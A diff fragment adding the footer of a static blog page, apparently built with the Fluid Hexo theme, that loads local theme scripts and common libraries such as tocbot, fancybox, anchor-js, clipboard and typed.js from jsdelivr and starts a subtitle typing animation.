+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
